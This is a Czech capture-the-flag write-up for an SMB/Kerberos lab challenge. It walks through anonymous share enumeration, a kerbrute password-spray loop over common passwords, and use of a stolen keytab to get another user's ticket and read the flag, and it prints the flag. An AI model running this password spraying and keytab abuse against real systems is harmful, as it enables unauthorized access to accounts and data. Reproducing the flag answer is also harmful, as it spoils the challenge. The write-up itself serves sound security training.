# Data Storage (3)

## Zadání

Hi Senior Researcher,

the scientific community needs to access a data repository for the timely completion of a groundbreaking scientific publication in vexillology, but the administrator of the repository and all its users are away from civilization on a teambuilding trip.

Your task is to gain the access.

Stay curious!

Data repository sits on `smb.nren.tcc`

## Řešení

Začneme skenováním portů

`nmap smb.nren.tcc`

```text
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Na serveru tedy běží úložiště s protokolem SMB.

Neznáme přihlašovací údaje, tak zkusíme anonymně vypsat obsah

`smbclient -L //smb.nren.tcc -N`

```text
        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        private         Disk      
        IPC$            IPC       IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u2)
```

`smbclient //smb.nren.tcc/public -N -c 'ls'`

```text
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
  teambuilding.txt                    N     1126  Tue Sep 29 22:32:03 2026
  it_notice.txt                       N      761  Tue Sep 29 22:32:03 2026
```

Složka private není přístupná.

Stáhneme soubory ze složky public

`smbclient //smb.nren.tcc/public -N -c 'get teambuilding.txt'`
`smbclient //smb.nren.tcc/public -N -c 'get it_notice.txt'`

it_notice.txt

```text
Attention everyone!
During the next six months the shares on this fileserver will be configured to require Kerberos authentication. This change is neccessary to comply with the company's new IS standards. 

For this purpose, we've created a new kerberos server:

realm: NREN.TCC
kdc: kdc.nren.tcc

For those who know how to work with kerberos, this should be sufficient, as your login will be the same as your company account, i.e. yourname@REALM. You should be able to Google the rest of the config.
For those who do not know what the above info means - DO NOT TOUCH ANYTHING. IT will migrate configured shares on client stations in a timely manner.

As a head of the IT department, I ask for your patience and understanding during this change.

Regards,
Kevin
```

teambuilding.txt

```text
2026 TEAMBUILDING CHART - local branch A
Note: Though attendance is not mandatory, it is highly recommended to participate. Regural gatherings are important to boost team's morale and get to know each other.
Date and place will be disclosed by HQ after all branches submit their attendance charts.

+-------------------+-----------------+--------------+-------------------+
| name              | attendance      | sleepover    | notes             |
+-------------------+-----------------+--------------+-------------------+
| kevin             | no              | no           | not interested    |
+-------------------+-----------------+--------------+-------------------+
| eve               | yes             | yes          | room with jane    |
+-------------------+-----------------+--------------+-------------------+
| jane              | yes             | yes          | room with eve     |
+-------------------+-----------------+--------------+-------------------+
| dmitri            | yes             | yes          | room with jane ;) |
+-------------------+-----------------+--------------+-------------------+
```

Takže máme informaci o přechodu přihlašování pomocí Kerberos

```text
realm: NREN.TCC
kdc: kdc.nren.tcc
... your login will be the same as your company account, i.e. yourname@REALM
```

a také seznam uživatelů

```text
kevin
eve
jane
dmitri
```

Heslo jsem nikde nenašel, takže ho zkusíme uhádnout. Použijeme kerbrute <https://github.com/ropnop/kerbrute>.

Vytvoříme konfigurační soubor `krb5.conf`

```text
[libdefaults]
    default_realm = NREN.TCC
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    NREN.TCC = {
        kdc = kdc.nren.tcc
        admin_server = kdc.nren.tcc
    }

[domain_realm]
    .nren.tcc = NREN.TCC
    nren.tcc = NREN.TCC   
```

A spustíme skript

```sh
while IFS= read -r p; do
  ./kerbrute passwordspray -d nren.tcc --dc kdc.nren.tcc users.txt "$p" | grep "VALID LOGIN"
done < 10k-most-common.txt  
```

Skript našel heslo login `jane:12345`.

Vyčteme obsah adresáře private.

```sh
echo -n '12345' | KRB5CCNAME=jane.ccache kinit jane@NREN.TCC
KRB5CCNAME=jane.ccache smbclient //smb.nren.tcc/private -k -c 'recurse ON; ls'
```

```text
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
  jane                                D        0  Fri Jun 19 03:39:23 2026
  kevin                               D        0  Fri Jun 19 03:39:23 2026
  eve                                 D        0  Fri Jun 19 03:39:23 2026
  dmitri                              D        0  Fri Jun 19 03:39:23 2026

\jane
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
  fact2.txt                           N      211  Tue Sep 29 22:32:03 2026
  image.png                           N    33301  Tue Sep 29 22:32:03 2026
  fact1.txt                           N      211  Tue Sep 29 22:32:03 2026
  fact3.txt                           N      211  Tue Sep 29 22:32:03 2026

\kevin
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
  kevin.keytab                        N      130  Tue Sep 29 22:32:03 2026
  flag.txt                            N       26  Tue Sep 29 22:32:03 2026

\eve
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
  testing.txt                         N        9  Tue Sep 29 22:32:03 2026

\dmitri
  .                                   D        0  Fri Jun 19 03:39:23 2026
  ..                                  D        0  Fri Jun 19 03:39:23 2026
```

Soubory ve složce uživatele jane neobsahují flag, ten je ve složce uživatele kevin, ale není přístupný. Ale je přístupný `kevin\kevin.keytab`

`KRB5CCNAME=jane.ccache smbclient //smb.nren.tcc/private -k -c 'cd kevin; get kevin.keytab'`

```sh
klist -ket kevin.keytab

Keytab name: FILE:kevin.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 06/01/2026 03:28:26 kevin@NREN.TCC (aes256-cts-hmac-sha1-96) 
   2 06/01/2026 03:28:26 kevin@NREN.TCC (aes128-cts-hmac-sha1-96) 
```

Z keytabu lze získat TGT bez znalosti hesla:

```sh
KRB5CCNAME=kevin.ccache kinit -kt kevin.keytab kevin@NREN.TCC
```

`KRB5CCNAME=kevin.ccache smbclient //smb.nren.tcc/private -k -c 'cd kevin; get flag.txt'`

Stažený soubor obsahuje flag.

## Flag

`FLAG{ShWJ-CVi0-cZ2W-7DsZ}`
